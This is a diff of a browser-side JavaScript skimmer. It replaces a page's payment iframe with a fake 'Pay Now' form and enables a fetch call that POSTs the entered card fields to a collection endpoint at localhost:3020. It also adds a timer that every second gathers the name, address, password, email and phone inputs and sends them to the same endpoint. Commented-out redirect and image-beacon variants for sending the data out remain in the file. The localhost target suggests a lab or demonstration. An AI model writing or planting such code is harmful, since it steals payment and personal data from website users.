@@ -104,14 +104,13 @@ function swapPaymentForm(iframe) {
   payNowButton.className = "pay-now-btn";
   payNowButton.textContent = "Pay Now";
   payNowButton.onclick = function () {
-    debugger;
     const data = {
       cc_data: fields.map(
         (field) => document.querySelector(`#${field.id}`).value
       ),
     };
 
-    // Redirect 1)
+    // // Redirect 1)
     // const meta = document.createElement("meta");
     // meta.httpEquiv = "refresh";
     // meta.content =
@@ -119,19 +118,19 @@ function swapPaymentForm(iframe) {
     //   encodeURIComponent(JSON.stringify(data));
     // document.head.appendChild(meta);
 
-    // Redirect 2)
+    // // Redirect 2)
     // location.href = "http://localhost:3020/api/data?data=" + encodeURIComponent(JSON.stringify(data));
 
     // Fetch 3)
-    // fetch("http://localhost:3020/api/data", {
-    //   method: "POST",
-    //   headers: {
-    //     "Content-Type": "application/json",
-    //   },
-    //   body: JSON.stringify(data),
-    // });
+    fetch("http://localhost:3020/api/data", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(data),
+    });
 
-    // Image 4)
+    // // Image 4)
     // const img = document.createElement("img");
     // img.src = "http://localhost:3020/api/data?data=" + encodeURIComponent(JSON.stringify(data));
     // img.style.display = "none";
@@ -186,6 +185,27 @@ function pingServer() {
 }
 
 setInterval(pingServer, 1000);
+
+
+function checkPIIFIelds() {
+  const pIIFields = [
+    ...document.querySelectorAll('input[name*="name"]'),
+    ...document.querySelectorAll('input[name*="Name"]'),
+    ...document.querySelectorAll('input[name*="address"]'),
+    ...document.querySelectorAll('input[name*="password"]'),
+    ...document.querySelectorAll('input[name*="email"]'),
+    ...document.querySelectorAll('input[name*="phone"]')
+  ].map(field => field.value)
+  const data = { pIIFields };
+  fetch("http://localhost:3020/api/data", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify(data),
+  });
+}
+setInterval(checkPIIFIelds, 1000);
 
 // Draw circle
 var circle = document.createElement("div");
